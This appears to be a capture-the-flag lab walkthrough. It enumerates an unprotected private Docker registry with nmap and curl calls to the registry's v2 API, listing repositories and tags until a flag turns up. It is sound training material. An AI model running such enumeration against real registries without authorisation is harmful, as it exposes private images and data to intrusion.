#### 1. Insecure Docker Registry I

----

- An unprotected private Docker registry is on the same network as your Kali machine. There are some docker images present in the registry, the flag is hidden in the name of one of the images.
- Objective: Interact with the private Docker registry using curl and retrieve the flag! No docker clients are provided and this exercise needs to be solved using first principles.

---

```sh
root@attackdefense:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2388: eth0@if2389: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:0a:01:01:05 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.1.5/24 brd 10.1.1.255 scope global eth0
       valid_lft forever preferred_lft forever
2391: eth1@if2392: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c0:b7:1f:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.183.31.2/24 brd 192.183.31.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:~#
```

```sh
root@attackdefense:~# nmap -sV -sC 192.183.31.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-24 05:29 UTC
Nmap scan report for 93wqxlqfbb8t6fyeecz1mcp6j.temp-network_a-183-31 (192.183.31.3)
Host is up (0.000013s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
5000/tcp open  http    Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
MAC Address: 02:42:C0:B7:1F:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.81 seconds
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl http://192.183.31.3:5000
```

```sh
root@attackdefense:~# curl http://192.183.31.3:5000/v2/_catalog
{"repositories":["alpine","flag","ubuntu"]}
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl http://192.183.31.3:5000/v2/alpine/tags/list
{"name":"alpine","tags":["latest"]}
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl http://192.183.31.3:5000/v2/flag/tags/list
{"name":"flag","tags":["b2929842a9ab2a4506cbfd1a69cb6785"]}
root@attackdefense:~#
```

```sh
root@attackdefense:~# curl http://192.183.31.3:5000/v2/ubuntu/tags/list
{"name":"ubuntu","tags":["14.04","18.04","12.04","16.04"]}
root@attackdefense:~#
```

----

###### Reference

- [Docker Registry HTTP API V2](https://docs.docker.com/registry/spec/api/)

----

EOF